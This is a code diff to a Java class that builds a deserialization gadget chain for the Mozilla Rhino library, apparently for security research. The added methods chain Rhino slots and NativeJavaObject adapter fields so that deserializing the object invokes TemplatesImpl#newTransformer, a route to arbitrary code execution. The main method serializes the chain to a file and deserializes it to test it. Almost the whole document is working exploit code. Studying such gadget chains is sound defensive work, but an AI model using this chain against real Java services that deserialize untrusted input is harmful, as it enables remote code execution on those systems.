@@ -19,6 +19,18 @@ import java.util.Map;
 
 public class MozillaRhinoExec {
 
+    static Method method;
+
+    static {
+        try {
+            method =
+                    MozillaRhinoExec.class.getMethod(
+                            "customWriteAdapterObject", Object.class, ObjectOutputStream.class);
+        } catch (NoSuchMethodException e) {
+            throw new RuntimeException(e);
+        }
+    }
+
     public static Object getContextObject() throws Exception {
         // 创建一个 ScriptableObject 对象，用于设置 NativeJavaObject 的成员 prototype
         // 此 ScriptableObject 对象的成员 associatedValues 是一个 Hashtable 对象，需要包含 key 值 "ClassCache"。
@@ -57,7 +69,127 @@ public class MozillaRhinoExec {
         Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject", method);
         Reflections.setFieldValue(nativeJavaObject, "prototype", dummyScope);
 
+        // parent 不能为 null，因为 NativeJavaObject#readObject 中，javaObject =
+        // adapter_readAdapterObject.invoke(null, args); 成功返回后会调用 initMembers();
+        Reflections.setFieldValue(nativeJavaObject, "parent", dummyScope);
+
         return nativeJavaObject;
+    }
+
+    public static Object getObject() throws Exception {
+        ScriptableObject dummyScope = new Environment();
+        Map<Object, Object> associatedValues = new Hashtable<>();
+        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
+        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
+
+        Environment env = new Environment();
+        Object messageSlot =
+                Reflections.getMethod(
+                                ScriptableObject.class,
+                                "getSlot",
+                                String.class,
+                                int.class,
+                                int.class)
+                        .invoke(env, "yy", 0, 4);
+
+        // 设定动态调用的方法为 TemplatesImpl#newTransformer
+        Method templateMethod = Reflections.getMethod(TemplatesImpl.class, "newTransformer");
+
+        // 创建 NativeJavaMethod
+        NativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, "templates");
+        Reflections.setFieldValue(messageSlot, "getter", transformerJavaMethod);
+
+        // 创建 NativeJavaObject
+        NativeJavaObject nativeJavaObject =
+                new NativeJavaObject(dummyScope, templatesImpl(), TemplatesImpl.class);
+        Reflections.setFieldValue(env, "prototypeObject", nativeJavaObject);
+
+        NativeJavaObject outer = new NativeJavaObject();
+        Reflections.setFieldValue(outer, "javaObject", env);
+        Reflections.setFieldValue(outer, "isAdapter", true);
+        Reflections.setFieldValue(outer, "adapter_writeAdapterObject", method);
+        Reflections.setFieldValue(outer, "prototype", dummyScope);
+
+        Reflections.setFieldValue(env, "parentScopeObject", getContextObject());
+
+        return outer;
+    }
+
+    // 仅用于测试，不可用
+    public static Object getObjectTest() throws Exception {
+        // 创建一个 ScriptableObject 对象，用于设置 NativeJavaObject 的成员 prototype
+        // 此 ScriptableObject 对象的成员 associatedValues 是一个 Hashtable 对象，需要包含 key 值 "ClassCache"。
+        ScriptableObject dummyScope = new Environment();
+        Map<Object, Object> associatedValues = new Hashtable<>();
+        associatedValues.put("ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
+        Reflections.setFieldValue(dummyScope, "associatedValues", associatedValues);
+
+        // 创建第一个 GetterSlot 调用 `Context#enter` 方法，第三个参数设置为 4，创建的才会是 GetterSlot
+        ScriptableObject scriptableObject = new Environment();
+        Object nameSlot =
+                Reflections.getMethod(
+                                ScriptableObject.class,
+                                "getSlot",
+                                String.class,
+                                int.class,
+                                int.class)
+                        .invoke(scriptableObject, "foo", 0, 4);
+
+        // 设定动态调用的方法为 Context#enter
+        Method enterMethod = Reflections.getMethod(Context.class, "enter");
+
+        // 创建 MemberBox
+        Class<?> memberBoxErrorClass = Class.forName("org.mozilla.javascript.MemberBox");
+        Object memberBox = Reflections.createWithoutConstructor(memberBoxErrorClass);
+        Reflections.getMethod(memberBoxErrorClass, "init", Method.class)
+                .invoke(memberBox, enterMethod);
+        Reflections.setFieldValue(nameSlot, "getter", memberBox);
+
+        NativeJavaObject nativeJavaObject = new NativeJavaObject();
+        Reflections.setFieldValue(nativeJavaObject, "javaObject", scriptableObject);
+        Reflections.setFieldValue(nativeJavaObject, "isAdapter", true);
+        Method method =
+                MozillaRhinoExec.class.getMethod(
+                        "customWriteAdapterObject", Object.class, ObjectOutputStream.class);
+        Reflections.setFieldValue(nativeJavaObject, "adapter_writeAdapterObject", method);
+        Reflections.setFieldValue(nativeJavaObject, "prototype", dummyScope);
+
+        // 第二个 Slot
+        ScriptableObject execScriptableObject = new Environment();
+        Map<Object, Object> associatedValuesCopy = new Hashtable<>();
+        associatedValuesCopy.put(
+                "ClassCache", Reflections.createWithoutConstructor(ClassCache.class));
+        Reflections.setFieldValue(execScriptableObject, "associatedValues", associatedValuesCopy);
+
+        Object messageSlot =
+                Reflections.getMethod(
+                                ScriptableObject.class,
+                                "getSlot",
+                                String.class,
+                                int.class,
+                                int.class)
+                        .invoke(execScriptableObject, "yy", 0, 4);
+        // 设定动态调用的方法为 TemplatesImpl#newTransformer
+        Method templateMethod = Reflections.getMethod(TemplatesImpl.class, "newTransformer");
+
+        // 创建 NativeJavaMethod
+        NativeJavaMethod transformerJavaMethod = new NativeJavaMethod(templateMethod, "templates");
+        Reflections.setFieldValue(messageSlot, "getter", transformerJavaMethod);
+
+        Context context = Context.enter();
+        NativeObject parent = (NativeObject) context.initStandardObjects();
+        NativeJavaObject inner = new NativeJavaObject(parent, templatesImpl(), TemplatesImpl.class);
+        Reflections.setFieldValue(execScriptableObject, "prototypeObject", inner);
+
+        Reflections.setFieldValue(execScriptableObject, "parentScopeObject", scriptableObject);
+
+        NativeJavaObject nativeJavaObject1 = new NativeJavaObject();
+        Reflections.setFieldValue(nativeJavaObject1, "javaObject", execScriptableObject);
+        Reflections.setFieldValue(nativeJavaObject1, "isAdapter", true);
+        Reflections.setFieldValue(nativeJavaObject1, "adapter_writeAdapterObject", method);
+        Reflections.setFieldValue(nativeJavaObject1, "prototype", dummyScope);
+
+        return nativeJavaObject1;
     }
 
     public static Object templatesImpl() throws Exception {
@@ -74,10 +206,6 @@ public class MozillaRhinoExec {
         return templatesImpl;
     }
 
-    public static Object getObject() throws Exception {
-        return null;
-    }
-
     public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out)
             throws IOException {
         out.writeObject("java.lang.Object");
@@ -90,7 +218,7 @@ public class MozillaRhinoExec {
         ObjectOutputStream oos =
                 new ObjectOutputStream(
                         Files.newOutputStream(Paths.get("target/MozillaRhinoExec.bin")));
-        oos.writeObject(getContextObject());
+        oos.writeObject(getObject());
 
         ObjectInputStream ois =
                 new ObjectInputStream(
